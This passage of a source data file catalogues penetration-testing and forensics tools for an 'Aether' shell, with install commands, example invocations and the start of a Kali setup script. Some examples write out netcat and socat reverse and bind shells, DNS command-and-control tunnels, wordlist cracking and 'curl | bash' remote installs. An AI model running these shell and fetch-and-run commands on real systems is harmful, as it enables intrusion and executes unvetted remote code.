      { name: 'action', flag: '', description: 'Action to perform', required: false, example: '--restore-all', type: 'select', options: ['--restore-all', '--restore-file filename', '--restore-directory dirname'] },
    ],
    examples: ['sudo extundelete /dev/sdb1 --restore-all', 'sudo extundelete /dev/sdb1 --restore-file important.doc'],
    tags: ['file-recovery', 'ext4'],
  },
  {
    id: 'ddrescue', name: 'ddrescue', category: 'forensics', source: 'kali',
    description: 'Data recovery tool. Copies data from damaged drives. Better than dd for recovery.',
    dangerLevel: 'info', command: 'ddrescue',
    installCmd: 'sudo apt install gddrescue',
    offline: true,
    args: [
      { name: 'input', flag: '', description: 'Input device/image', required: true, example: '/dev/sda', type: 'text' },
      { name: 'output', flag: '', description: 'Output image file', required: true, example: 'recovery.img', type: 'text' },
    ],
    examples: ['sudo ddrescue /dev/sda recovery.img rescue.log'],
    tags: ['data-recovery', 'disk-imaging'],
  },
  {
    id: 'strings', name: 'Strings', category: 'forensics', source: 'kali',
    description: 'Extract printable strings from binary files. Essential for reverse engineering.',
    dangerLevel: 'info', command: 'strings',
    installCmd: 'sudo apt install binutils',
    offline: true,
    args: [
      { name: 'file', flag: '', description: 'Binary file to analyze', required: true, example: 'binary_file', type: 'text' },
      { name: 'min_length', flag: '-n', description: 'Minimum string length', required: false, example: '6', type: 'number' },
    ],
    examples: ['strings binary_file | grep password', 'strings -n 10 firmware.bin', 'strings -e l binary_file  # UTF-16LE'],
    tags: ['binary-analysis', 'essential'],
  },

  // ═══════════════════════════════════════════
  // REVERSE ENGINEERING (8 tools)
  // ═══════════════════════════════════════════
  {
    id: 'ghidra', name: 'Ghidra', category: 'reverse', source: 'kali',
    description: 'NSA\'s reverse engineering suite. Decompiler, disassembler, debugger. Headless mode available.',
    dangerLevel: 'medium', command: 'analyzeHeadless',
    installCmd: 'sudo apt install ghidra',
    offline: true,
    args: [
      { name: 'project_dir', flag: '', description: 'Project directory', required: true, example: '/tmp/ghidra_project', type: 'text' },
      { name: 'project_name', flag: '', description: 'Project name', required: true, example: 'analysis', type: 'text' },
      { name: 'binary', flag: '-import', description: 'Binary to analyze', required: true, example: 'target_binary', type: 'text' },
    ],
    examples: ['analyzeHeadless /tmp/project analysis -import target_binary -postScript decompile.py', 'ghidra  # Launch GUI'],
    notes: 'Headless mode for automated analysis. GUI for interactive reverse engineering.',
    tags: ['decompiler', 'disassembler', 'essential'],
  },
  {
    id: 'radare2', name: 'Radare2', category: 'reverse', source: 'kali',
    description: 'Advanced command-line reverse engineering framework. Disassembly, debugging, analysis.',
    dangerLevel: 'medium', command: 'r2',
    installCmd: 'sudo apt install radare2',
    offline: true,
    args: [
      { name: 'binary', flag: '', description: 'Binary file to analyze', required: true, example: 'target_binary', type: 'text' },
    ],
    examples: ['r2 -A target_binary  # Analyze', 'r2 -d target_binary  # Debug', 'rabin2 -I target_binary  # Info'],
    notes: 'Full framework with hundreds of commands. rabin2 for binary info, r2 for interactive analysis.',
    tags: ['framework', 'disassembler', 'debugger'],
  },
  {
    id: 'gdb', name: 'GDB', category: 'reverse', source: 'kali',
    description: 'GNU Debugger. Standard debugging tool for C/C++/Go binaries.',
    dangerLevel: 'info', command: 'gdb',
    installCmd: 'sudo apt install gdb',
    offline: true,
    args: [
      { name: 'binary', flag: '', description: 'Binary to debug', required: true, example: './target', type: 'text' },
    ],
    examples: ['gdb ./target', 'gdb -batch -ex "set disassembly-flavor intel" -ex "disas main" ./target'],
    tags: ['debugger', 'essential'],
  },
  {
    id: 'objdump', name: 'Objdump', category: 'reverse', source: 'kali',
    description: 'Display information from object files. Disassembly, section headers, symbols.',
    dangerLevel: 'info', command: 'objdump',
    installCmd: 'sudo apt install binutils',
    offline: true,
    args: [
      { name: 'binary', flag: '', description: 'Binary file', required: true, example: 'target_binary', type: 'text' },
      { name: 'action', flag: '-d', description: 'Action', required: false, example: '-d', type: 'select', options: ['-d (Disassemble)', '-D (All sections)', '-t (Symbols)', '-h (Headers)', '-x (All headers)'] },
    ],
    examples: ['objdump -d target_binary | less', 'objdump -t target_binary  # Symbol table', 'objdump -M intel -d target_binary  # Intel syntax'],
    tags: ['disassembly', 'binary-analysis'],
  },
  {
    id: 'readelf', name: 'ReadELF', category: 'reverse', source: 'kali',
    description: 'Display ELF format information. Headers, segments, symbols, dynamic section.',
    dangerLevel: 'info', command: 'readelf',
    installCmd: 'sudo apt install binutils',
    offline: true,
    args: [
      { name: 'binary', flag: '', description: 'ELF binary', required: true, example: 'target_binary', type: 'text' },
      { name: 'action', flag: '-a', description: 'Display option', required: false, example: '-a', type: 'select', options: ['-a (All)', '-h (ELF Header)', '-l (Segments)', '-S (Sections)', '-s (Symbols)', '-d (Dynamic)'] },
    ],
    examples: ['readelf -a target_binary', 'readelf -h target_binary  # ELF header', 'readelf -s target_binary  # Symbol table'],
    tags: ['elf-analysis', 'binary-info'],
  },
  {
    id: 'strace', name: 'Strace', category: 'reverse', source: 'kali',
    description: 'Trace system calls and signals. Monitor what a program is doing at the kernel level.',
    dangerLevel: 'low', command: 'strace',
    installCmd: 'sudo apt install strace',
    offline: true,
    args: [
      { name: 'program', flag: '', description: 'Program to trace', required: true, example: 'ls', type: 'text' },
    ],
    examples: ['strace -f ./target_binary', 'strace -e trace=open,read,write ./target_binary', 'strace -p PID  # Attach to running process'],
    tags: ['syscall-trace', 'monitoring'],
  },
  {
    id: 'ltrace', name: 'Ltrace', category: 'reverse', source: 'kali',
    description: 'Trace library calls. Monitor dynamic library function calls of a program.',
    dangerLevel: 'low', command: 'ltrace',
    installCmd: 'sudo apt install ltrace',
    offline: true,
    args: [
      { name: 'program', flag: '', description: 'Program to trace', required: true, example: './target', type: 'text' },
    ],
    examples: ['ltrace ./target_binary', 'ltrace -S ./target_binary  # System calls too', 'ltrace -e strcmp ./target_binary'],
    tags: ['library-trace', 'monitoring'],
  },
  {
    id: 'rizin', name: 'Rizin', category: 'reverse', source: 'kali',
    description: 'Fork of radare2. Clean reverse engineering framework with improved UX.',
    dangerLevel: 'medium', command: 'rizin',
    installCmd: 'sudo apt install rizin || git clone https://github.com/rizinorg/rizin',
    offline: true,
    args: [
      { name: 'binary', flag: '', description: 'Binary to analyze', required: true, example: 'target_binary', type: 'text' },
    ],
    examples: ['rizin -A target_binary  # Analyze', 'rz-bin -I target_binary  # Binary info'],
    tags: ['disassembler', 'radare2-fork'],
  },

  // ═══════════════════════════════════════════
  // SYSTEM (8 tools)
  // ═══════════════════════════════════════════
  {
    id: 'lynis', name: 'Lynis', category: 'system', source: 'kali',
    description: 'Security auditing tool for Linux/Unix. System hardening and compliance testing.',
    dangerLevel: 'low', command: 'lynis',
    installCmd: 'sudo apt install lynis',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Audit mode', required: false, example: 'audit system', type: 'select', options: ['audit system', 'audit system quick', 'audit docker', 'show categories'] },
    ],
    examples: ['sudo lynis audit system', 'sudo lynis audit system quick', 'lynis show categories'],
    tags: ['hardening', 'audit', 'essential'],
  },
  {
    id: 'chkrootkit', name: 'CHKRootkit', category: 'system', source: 'kali',
    description: 'Rootkit detector. Scans for known rootkits and signs of compromise.',
    dangerLevel: 'low', command: 'chkrootkit',
    installCmd: 'sudo apt install chkrootkit',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Scan mode', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo chkrootkit', 'sudo chkrootkit -x  # Expert mode with explanations'],
    tags: ['rootkit-detection', 'malware'],
  },
  {
    id: 'rkhunter', name: 'RKHunter', category: 'system', source: 'kali',
    description: 'Rootkit, backdoor, and local exploit scanner. Checks system binaries and configs.',
    dangerLevel: 'low', command: 'rkhunter',
    installCmd: 'sudo apt install rkhunter',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'Action', required: false, example: '--check', type: 'select', options: ['--check', '--update', '--check --skip-keypress', '--propupd'] },
    ],
    examples: ['sudo rkhunter --check', 'sudo rkhunter --update && sudo rkhunter --check --skip-keypress'],
    tags: ['rootkit-detection', 'integrity-check'],
  },
  {
    id: 'fail2ban', name: 'Fail2Ban', category: 'system', source: 'kali',
    description: 'Intrusion prevention framework. Bans IPs after too many failed login attempts.',
    dangerLevel: 'low', command: 'fail2ban-client',
    installCmd: 'sudo apt install fail2ban',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'Action', required: false, example: 'status', type: 'select', options: ['status', 'status sshd', 'start', 'stop', 'reload', 'set unbanip IP'] },
    ],
    examples: ['sudo fail2ban-client status sshd', 'sudo fail2ban-client set sshd unbanip 192.168.1.100'],
    tags: ['ids', 'brute-force-protection', 'essential'],
  },
  {
    id: 'ufw', name: 'UFW Firewall', category: 'system', source: 'kali',
    description: 'Uncomplicated Firewall. Easy iptables frontend for managing firewall rules.',
    dangerLevel: 'medium', command: 'ufw',
    installCmd: 'sudo apt install ufw',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'Firewall action', required: true, example: 'allow 22/tcp', type: 'select', options: ['enable', 'disable', 'status', 'status verbose', 'allow PORT/tcp', 'deny from IP', 'delete RULE'] },
    ],
    examples: ['sudo ufw enable', 'sudo ufw allow 22/tcp', 'sudo ufw allow 80,443/tcp', 'sudo ufw deny from 192.168.1.100', 'sudo ufw status verbose'],
    tags: ['firewall', 'essential'],
  },
  {
    id: 'tiger', name: 'Tiger', category: 'system', source: 'kali',
    description: 'Security audit and intrusion detection tool for Unix systems.',
    dangerLevel: 'low', command: 'tiger',
    installCmd: 'sudo apt install tiger',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Audit type', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo tiger', 'sudo tiger -q  # Quiet mode'],
    tags: ['audit', 'intrusion-detection'],
  },
  {
    id: 'lasso', name: 'LASSO', category: 'system', source: 'custom',
    description: 'Linux Auditing and Security Script Organizer. Comprehensive security checklist.',
    dangerLevel: 'low', command: 'lasso',
    installCmd: 'git clone https://github.com/carlospolop/LASSO.git && cd LASSO && ./install.sh',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Run mode', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo lasso'],
    tags: ['audit', 'hardening', 'checklist'],
  },
  {
    id: 'pspy', name: 'pspy', category: 'system', source: 'custom',
    description: 'Monitor Linux processes without root. Detects cron jobs and background tasks.',
    dangerLevel: 'low', command: './pspy',
    installCmd: 'wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64',
    offline: true,
    args: [
      { name: 'pid', flag: '-p', description: 'PID to monitor', required: false, example: '1', type: 'number' },
    ],
    examples: ['./pspy64', './pspy64 -p 1  # Monitor init and children'],
    tags: ['process-monitoring'],
  },

  // ═══════════════════════════════════════════
  // NETWORK (8 tools)
  // ═══════════════════════════════════════════
  {
    id: 'netcat', name: 'Netcat', category: 'network', source: 'kali',
    description: 'TCP/IP swiss army knife. Port scanning, file transfer, reverse shells, listeners.',
    dangerLevel: 'medium', command: 'nc',
    installCmd: 'sudo apt install netcat-openbsd',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target host/port', required: true, example: '192.168.1.100 4444', type: 'text' },
      { name: 'mode', flag: '-l', description: 'Listen mode', required: false, example: '', type: 'select', options: ['-l (Listen)', '-lvp PORT (Listen + Verbose)', '-e /bin/bash (Bind Shell)', '-nv (Reverse Shell)'] },
    ],
    examples: ['nc -lvp 4444  # Listener', 'nc -nv 192.168.1.100 4444  # Connect', 'nc -e /bin/bash 192.168.1.100 4444  # Reverse shell'],
    tags: ['network-utility', 'essential', 'shell'],
  },
  {
    id: 'socat', name: 'Socat', category: 'network', source: 'kali',
    description: 'Advanced network relay tool. More powerful than netcat. Encryption, proxying, forwarding.',
    dangerLevel: 'medium', command: 'socat',
    installCmd: 'sudo apt install socat',
    offline: true,
    args: [
      { name: 'source', flag: '', description: 'Source address', required: true, example: 'TCP-LISTEN:4444,reuseaddr,fork', type: 'text' },
      { name: 'dest', flag: '', description: 'Destination address', required: true, example: 'EXEC:/bin/bash', type: 'text' },
    ],
    examples: ['socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash', 'socat TCP:192.168.1.100:80 TCP:192.168.1.1:8080', 'socat FILE:/tmp/upload TCP:192.168.1.100:4444'],
    tags: ['relay', 'port-forward', 'encryption'],
  },
  {
    id: 'proxychains', name: 'ProxyChains', category: 'network', source: 'kali',
    description: 'Route TCP connections through proxy servers (SOCKS4/5, HTTP). Tor support.',
    dangerLevel: 'medium', command: 'proxychains4',
    installCmd: 'sudo apt install proxychains4',
    offline: true,
    args: [
      { name: 'command', flag: '', description: 'Command to proxy', required: true, example: 'nmap -sT 192.168.1.1', type: 'text' },
    ],
    examples: ['proxychains4 nmap -sT 192.168.1.1', 'proxychains4 curl https://example.com', 'proxychains4 firefox'],
    notes: 'Configure in /etc/proxychains4.conf. Supports SOCKS4/5, HTTP, Tor.',
    tags: ['proxy', 'anonymity', 'tor'],
  },
  {
    id: 'sshuttle', name: 'SSHuttle', category: 'network', source: 'kali',
    description: 'Transparent proxy through SSH. VPN-like tunnel without admin access on server.',
    dangerLevel: 'medium', command: 'sshuttle',
    installCmd: 'pip3 install sshuttle || sudo apt install sshuttle',
    offline: true,
    args: [
      { name: 'subnet', flag: '', description: 'Subnet to route', required: true, example: '0/0', type: 'text' },
      { name: 'ssh_host', flag: '', description: 'SSH server to tunnel through', required: true, example: 'user@192.168.1.100', type: 'text' },
    ],
    examples: ['sshuttle -r user@192.168.1.100 0/0', 'sshuttle -r user@server -N 10.0.0.0/8 172.16.0.0/12'],
    tags: ['vpn', 'tunnel', 'ssh'],
  },
  {
    id: 'iodine', name: 'Iodine', category: 'network', source: 'kali',
    description: 'DNS tunneling tool. Bypass network restrictions by tunneling over DNS queries.',
    dangerLevel: 'high', command: 'iodine',
    installCmd: 'sudo apt install iodine',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Server or client', required: true, example: '-f', type: 'select', options: ['Server: iodine -f -P password tunnel.domain.com', 'Client: iodine -f -P password server_ip tunnel.domain.com'] },
    ],
    examples: ['iodine -f -P hack123 10.0.0.1 tunnel.mydomain.com  # Client', 'sudo iodined -f -c -P hack123 10.0.0.1 tunnel.mydomain.com  # Server'],
    tags: ['dns-tunnel', 'bypass', 'covert'],
  },
  {
    id: 'dnscat2', name: 'DNSCat2', category: 'network', source: 'kali',
    description: 'DNS tunneling tool. Encrypted command-and-control over DNS.',
    dangerLevel: 'high', command: 'dnscat2',
    installCmd: 'sudo apt install dnscat2 || git clone https://github.com/iagox86/dnscat2.git',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Server or client', required: true, example: 'server', type: 'text' },
    ],
    examples: ['ruby dnscat2.rb tunnel.domain.com  # Server', 'dnscat2 tunnel.domain.com  # Client'],
    tags: ['dns-tunnel', 'c2'],
  },
  {
    id: 'nmap-ndiff', name: 'Ndiff', category: 'network', source: 'kali',
    description: 'Compare Nmap scan results. Track changes in network infrastructure over time.',
    dangerLevel: 'info', command: 'ndiff',
    installCmd: 'sudo apt install ndiff',
    offline: true,
    args: [
      { name: 'scan1', flag: '', description: 'First scan XML output', required: true, example: 'scan1.xml', type: 'text' },
      { name: 'scan2', flag: '', description: 'Second scan XML output', required: true, example: 'scan2.xml', type: 'text' },
    ],
    examples: ['ndiff scan1.xml scan2.xml', 'nmap -sV 192.168.1.0/24 -oX scan1.xml  # Then later: nmap -sV 192.168.1.0/24 -oX scan2.xml && ndiff scan1.xml scan2.xml'],
    tags: ['comparison', 'monitoring', 'nmap'],
  },
  {
    id: 'netdiscover', name: 'Netdiscover', category: 'network', source: 'kali',
    description: 'ARP-based network scanner. Discovers live hosts on the network using ARP requests.',
    dangerLevel: 'low', command: 'netdiscover',
    installCmd: 'sudo apt install netdiscover',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Interface', required: false, example: 'eth0', type: 'text' },
      { name: 'range', flag: '-r', description: 'IP range', required: false, example: '192.168.1.0/24', type: 'text' },
    ],
    examples: ['sudo netdiscover -r 192.168.1.0/24', 'sudo netdiscover -i eth0'],
    tags: ['arp-scan', 'host-discovery'],
  },

  // ═══════════════════════════════════════════
  // CRYPTOGRAPHY (8 tools)
  // ═══════════════════════════════════════════
  {
    id: 'openssl', name: 'OpenSSL', category: 'crypto', source: 'kali',
    description: 'Cryptographic toolkit. SSL/TLS testing, certificate analysis, encryption, hashing.',
    dangerLevel: 'info', command: 'openssl',
    installCmd: 'sudo apt install openssl',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'OpenSSL command', required: true, example: 's_client', type: 'text' },
    ],
    examples: ['openssl s_client -connect example.com:443  # Check SSL cert', 'openssl x509 -in cert.pem -text -noout', 'openssl enc -aes-256-cbc -salt -in file.txt -out file.enc', 'openssl dgst -sha256 file.txt'],
    tags: ['ssl', 'encryption', 'essential'],
  },
  {
    id: 'gpg', name: 'GPG', category: 'crypto', source: 'kali',
    description: 'GNU Privacy Guard. Encrypt, sign, and manage keys and certificates.',
    dangerLevel: 'info', command: 'gpg',
    installCmd: 'sudo apt install gnupg',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'GPG operation', required: true, example: '--list-keys', type: 'select', options: ['--gen-key (Generate)', '--encrypt (Encrypt)', '--decrypt (Decrypt)', '--sign (Sign)', '--verify (Verify)', '--list-keys (List keys)'] },
    ],
    examples: ['gpg --gen-key', 'gpg --encrypt --recipient user@email.com file.txt', 'gpg --decrypt file.txt.gpg', 'gpg --import public.key'],
    tags: ['encryption', 'signing', 'pgp'],
  },
  {
    id: 'steghide', name: 'Steghide', category: 'crypto', source: 'kali',
    description: 'Steganography tool. Hide data inside image and audio files.',
    dangerLevel: 'info', command: 'steghide',
    installCmd: 'sudo apt install steghide',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'Embed or extract', required: true, example: 'embed', type: 'select', options: ['embed (Hide data)', 'extract (Reveal data)', 'info (Show info)'] },
      { name: 'cover', flag: '-cf', description: 'Cover file (image/audio)', required: true, example: 'image.jpg', type: 'text' },
    ],
    examples: ['steghide embed -cf image.jpg -ef secret.txt', 'steghide extract -sf image.jpg', 'steghide info image.jpg'],
    tags: ['steganography', 'data-hiding'],
  },
  {
    id: 'stegseek', name: 'StegSeek', category: 'crypto', source: 'kali',
    description: 'Crack steganography passwords. Fast brute force for steghide-embedded files.',
    dangerLevel: 'low', command: 'stegseek',
    installCmd: 'sudo apt install stegseek || wget https://github.com/RickdeJager/stegseek/releases/latest/download/stegseek_linux_x64.tar.gz',
    offline: true,
    args: [
      { name: 'image', flag: '', description: 'Image file to crack', required: true, example: 'image.jpg', type: 'text' },
      { name: 'wordlist', flag: '-sf', description: 'Wordlist', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['stegseek image.jpg /usr/share/wordlists/rockyou.txt', 'stegseek image.jpg -xf extracted.txt  # Extract after crack'],
    tags: ['steganography', 'cracking'],
  },
  {
    id: 'hash-identifier', name: 'HashID Extended', category: 'crypto', source: 'kali',
    description: 'Advanced hash type identification. Identifies 200+ hash algorithms.',
    dangerLevel: 'info', command: 'hash-identifier',
    installCmd: 'sudo apt install hash-identifier || pip3 install hashid',
    offline: true,
    args: [
      { name: 'hash', flag: '', description: 'Hash to identify', required: true, example: 'e99a18c428cb38d5f260853678922e03', type: 'text' },
    ],
    examples: ['hash-identifier'],
    tags: ['hash-identify'],
  },
  {
    id: 'cryptsetup', name: 'Cryptsetup', category: 'crypto', source: 'kali',
    description: 'LUKS disk encryption management. Full disk encryption for Linux.',
    dangerLevel: 'medium', command: 'cryptsetup',
    installCmd: 'sudo apt install cryptsetup',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'LUKS operation', required: true, example: 'luksOpen', type: 'select', options: ['luksFormat (Encrypt)', 'luksOpen (Open)', 'luksClose (Close)', 'luksDump (Info)', 'luksAddKey (Add key)'] },
    ],
    examples: ['sudo cryptsetup luksFormat /dev/sdb1', 'sudo cryptsetup luksOpen /dev/sdb1 encrypted', 'sudo cryptsetup luksDump /dev/sdb1'],
    tags: ['disk-encryption', 'luks'],
  },
  {
    id: 'john-ssh', name: 'SSH2John', category: 'crypto', source: 'custom',
    description: 'Converts SSH private keys to hashcat/john format for cracking.',
    dangerLevel: 'medium', command: 'ssh2john',
    installCmd: 'python3 /usr/share/john/ssh2john.py || git clone https://github.com/openwall/john',
    offline: true,
    args: [
      { name: 'keyfile', flag: '', description: 'SSH private key file', required: true, example: 'id_rsa', type: 'text' },
    ],
    examples: ['python3 ssh2john.py id_rsa > ssh_hash.txt && john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'],
    tags: ['ssh', 'key-cracking'],
  },
  {
    id: 'pdf-crack', name: 'PDFCrack', category: 'crypto', source: 'kali',
    description: 'Crack password-protected PDF files using brute force or wordlists.',
    dangerLevel: 'low', command: 'pdfcrack',
    installCmd: 'sudo apt install pdfcrack',
    offline: true,
    args: [
      { name: 'file', flag: '-f', description: 'PDF file', required: true, example: 'protected.pdf', type: 'text' },
      { name: 'wordlist', flag: '-w', description: 'Wordlist', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['pdfcrack -f protected.pdf -w /usr/share/wordlists/rockyou.txt', 'pdfcrack -f protected.pdf -n 6 -m 8 -c abcdef0123456789'],
    tags: ['pdf-cracking', 'password-recovery'],
  },

  // ═══════════════════════════════════════════
  // CUSTOM AETHER SCRIPTS (10 tools)
  // ═══════════════════════════════════════════
  {
    id: 'aether-recon', name: 'Aether AutoRecon', category: 'scripts', source: 'custom',
    description: 'Automated full reconnaissance pipeline: port scan, service detection, DNS, whois, and directory brute force.',
    dangerLevel: 'medium', command: 'aether-recon',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target IP or domain', required: true, example: '192.168.1.0/24', type: 'text' },
      { name: 'depth', flag: '', description: 'Scan depth', required: false, example: '2', type: 'select', options: ['1 (Quick)', '2 (Standard)', '3 (Deep)'] },
    ],
    examples: ['aether-recon 192.168.1.0/24', 'aether-recon example.com 3'],
    notes: 'Runs nmap, whatweb, dnsenum, dirb automatically. Saves results to /opt/aether/results/.',
    tags: ['automation', 'pipeline', 'recon'],
  },
  {
    id: 'aether-pwn', name: 'Aether QuickPwn', category: 'scripts', source: 'custom',
    description: 'Automated exploitation checklist. Checks for common vulnerabilities and attempts exploits.',
    dangerLevel: 'critical', command: 'aether-pwn',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target IP or URL', required: true, example: 'http://192.168.1.100', type: 'text' },
    ],
    examples: ['aether-pwn 192.168.1.100', 'aether-pwn http://192.168.1.100'],
    notes: 'Checks for: open SMB, RDP, weak creds, known exploits, misconfigurations. Requires caution.',
    tags: ['automation', 'exploitation'],
  },
  {
    id: 'aether-wifi', name: 'Aether WiFiAudit', category: 'scripts', source: 'custom',
    description: 'Automated WiFi security assessment. Captures handshakes, checks WPS, and generates report.',
    dangerLevel: 'high', command: 'aether-wifi',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'interface', flag: '', description: 'Wireless interface', required: true, example: 'wlan0', type: 'text' },
    ],
    examples: ['sudo aether-wifi wlan0'],
    notes: 'Requires wireless adapter supporting monitor mode and packet injection.',
    tags: ['wifi', 'automation', 'wireless'],
  },
  {
    id: 'aether-encrypt', name: 'Aether FileVault', category: 'scripts', source: 'custom',
    description: 'Encrypt/decrypt files with AES-256. Secure file operations for operational security.',
    dangerLevel: 'info', command: 'aether-encrypt',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'action', flag: '', description: 'Encrypt or decrypt', required: true, example: 'encrypt', type: 'select', options: ['encrypt', 'decrypt'] },
      { name: 'file', flag: '', description: 'File to process', required: true, example: 'secrets.txt', type: 'text' },
    ],
    examples: ['aether-encrypt encrypt secrets.txt', 'aether-encrypt decrypt secrets.txt.enc'],
    tags: ['encryption', 'file-security'],
  },
  {
    id: 'aether-hardening', name: 'Aether Hardener', category: 'scripts', source: 'custom',
    description: 'System hardening script. Firewall, SSH hardening, disable unnecessary services, kernel params.',
    dangerLevel: 'info', command: 'aether-hardening',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'level', flag: '', description: 'Hardening level', required: false, example: '2', type: 'select', options: ['1 (Basic)', '2 (Standard)', '3 (Paranoid)'] },
    ],
    examples: ['sudo aether-hardening 2', 'sudo aether-hardening 3'],
    tags: ['hardening', 'security', 'setup'],
  },
  {
    id: 'aether-monitor', name: 'Aether NetMonitor', category: 'scripts', source: 'custom',
    description: 'Real-time network traffic monitor. Shows connections, bandwidth, and suspicious activity.',
    dangerLevel: 'low', command: 'aether-monitor',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'interface', flag: '', description: 'Interface to monitor', required: false, example: 'eth0', type: 'text' },
    ],
    examples: ['sudo aether-monitor eth0', 'sudo aether-monitor'],
    tags: ['monitoring', 'network', 'realtime'],
  },
  {
    id: 'aether-log', name: 'Aether LogHunter', category: 'scripts', source: 'custom',
    description: 'Hunt through system logs for suspicious activity. Failed logins, privilege escalation, anomalies.',
    dangerLevel: 'info', command: 'aether-log',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'log_type', flag: '', description: 'Log type', required: false, example: 'auth', type: 'select', options: ['auth (Authentication)', 'syslog (System)', 'kern (Kernel)', 'all (Everything)'] },
    ],
    examples: ['sudo aether-log auth', 'sudo aether-log all'],
    tags: ['log-analysis', 'forensics', 'monitoring'],
  },
  {
    id: 'aether-privesc', name: 'Aether PrivCheck', category: 'scripts', source: 'custom',
    description: 'Privilege escalation checker. SUID binaries, writable paths, cron jobs, capabilities.',
    dangerLevel: 'medium', command: 'aether-privesc',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Check mode', required: false, example: '', type: 'text' },
    ],
    examples: ['aether-privesc'],
    tags: ['privesc', 'enumeration'],
  },
  {
    id: 'aether-report', name: 'Aether ReportGen', category: 'scripts', source: 'custom',
    description: 'Generate professional penetration testing reports from scan results.',
    dangerLevel: 'info', command: 'aether-report',
    installCmd: 'bash /opt/aether/scripts/setup.sh',
    offline: true,
    args: [
      { name: 'results_dir', flag: '', description: 'Directory with scan results', required: true, example: '/opt/aether/results/scan_001', type: 'text' },
    ],
    examples: ['aether-report /opt/aether/results/scan_001'],
    tags: ['reporting', 'documentation'],
  },
  {
    id: 'aether-setup', name: 'Aether Install', category: 'scripts', source: 'custom',
    description: 'Full Aether tool suite installer. Installs all dependencies, tools, and scripts.',
    dangerLevel: 'info', command: 'aether-setup',
    installCmd: 'curl -sL https://raw.githubusercontent.com/mrsaggynutz/Nex.AI-terminal-codeing-assistant/main/scripts/setup.sh | bash',
    offline: false,
    args: [
      { name: 'environment', flag: '', description: 'Target environment', required: false, example: 'kali', type: 'select', options: ['kali (Kali Linux)', 'debian (Debian/Ubuntu)', 'termux (Android)', 'nix (NixOS)', 'armbian (Orange Pi)'] },
    ],
    examples: ['sudo aether-setup kali', 'sudo aether-setup armbian', 'aether-setup termux'],
    tags: ['installer', 'setup', 'automation'],
  },
];

// Setup scripts for different environments
export const SETUP_SCRIPTS = [
  {
    name: 'Kali Linux Full Setup',
    description: 'Install all compatible tools on Kali Linux',
    environment: 'kali',
    script: `#!/bin/bash
# AETHER.SHELL - Kali Linux Full Setup
echo "[*] AETHER.SHELL - Kali Linux Tool Installation"
echo "[*] Updating package lists..."
sudo apt update && sudo apt upgrade -y

echo "[*] Installing core tools..."
sudo apt install -y nmap masscan nikto sqlmap hydra john hashcat metasploit-framework \\
  aircrack-ng wifite reaver bettercap wireshark tshark tcpdump netcat-openbsd socat \\
  burpsuite owasp-zap gobuster ffuf feroxbuster dirb nuclei wpscan joomscan \\
  binwalk volatility3 sleuth-kit foremost bulk_extractor scalpel \\
  radare2 ghidra gdb strace ltrace \\
  lynis chkrootkit rkhunter fail2ban ufw tiger \\
  macchanger proxychains4 sshuttle iodine openssl steghide steghide \\
  crackmapexec evil-winrm impacket-scripts searchsploit exploitdb \\
  dsniff responder mitmproxy ettercap \\
  hashid crunch cewl patator subfinder amass theharvester sherlock whatweb \\
  wafw00f recon-ng dnsenum dnsrecon enum4linux lbd hcxtools hcxdumptool \\
  testssl.sh curl wget git python3 python3-pip gcc g++ make

echo "[*] Installing Python tools..."
pip3 install sherlock-project wafw00f arjun secretfinder nuclei dalfox waybackurls \\
  hashid paramspider medusa

echo "[*] Installing Go tools..."
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest \\
  github.com/projectdiscovery/httpx/cmd/httpx@latest \\
  github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest \\
  github.com/ffuf/ffuf/v2@latest \\
  github.com/hahwul/dalfox/v2@latest \\
  github.com/tomnomnom/waybackurls@latest \\
  github.com/lc/subjs@latest \\
  github.com/Emoe/kxss@latest \\
  github.com/jpillora/chisel@latest \\
  github.com/hakluke/hakrawler@latest \\
  github.com/lmpizarro/hakrawler@latest 2>/dev/null

echo "[*] Downloading SecLists..."
if [ ! -d /usr/share/seclists ]; then
  sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists
fi

echo "[*] Downloading wordlists..."
if [ ! -f /usr/share/wordlists/rockyou.txt ]; then
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null &
fi

echo "[*] Installing LinPEAS..."
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /opt/linpeas.sh
chmod +x /opt/linpeas.sh

